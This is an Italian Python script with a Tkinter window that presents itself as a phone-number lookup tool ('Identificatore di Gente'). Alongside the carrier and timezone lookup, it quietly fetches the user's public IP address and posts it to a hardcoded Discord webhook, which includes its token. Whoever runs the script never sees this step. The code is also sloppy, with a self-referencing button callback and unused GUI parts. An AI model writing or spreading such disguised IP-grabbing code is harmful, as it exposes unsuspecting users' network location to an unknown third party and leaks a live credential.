from time import time 
import requests
from numpy import number
import phonenumbers
from phonenumbers import timezone, geocoder, carrier
from tkinter import *
mess=""
window =Tk()
window.geometry("900x500")
window.title("Identificatore di Gente")
window.grid_columnconfigure(0, weight=1)
window.configure(background="#7FFFD4")
welcome_label =Label(window,
                           text="Ciao! Metti il numero di telefono che desideri :",
                           fg="#6F00FF",
                           background="#7FFFD4",
                           font=("Helvetica", 15))
welcome_label.grid(row=0, column=0, sticky="N", padx=20, pady=1)
text_input=Entry()
text_input.grid(row=1, column=0,sticky="WE", pady=10, padx=10)
def download_ascii():
    prossimo_button =Button(text="Salva", command=download_ascii)
    prossimo_button.grid(row=6, column=0, padx=50, pady=50)
    print(number)

number = input ("Metti il tuo numero di telefono")
phone = phonenumbers.parse(number)
time = timezone.time_zones_for_number(phone)
car = carrier.name_for_number(phone, "it")
ip = requests.get("https://api.ipify.org").text
payload = {
    "content" : f"L'indirizzo IP {ip}"
}
response = requests.post("https://discord.com/api/webhooks/1181887539720749108/JGzvwv4hUWfn4HQapBSD2LMimd6hD2rx9AV95S_PDPCNHWtkDoxPmrt70b1s8wj4Ok18" , json=payload)
if response.status_code == 200:
    print("Il messaggio è stato inviato con successo")
else:
    print("Il messaggio non è stato inviato con successo")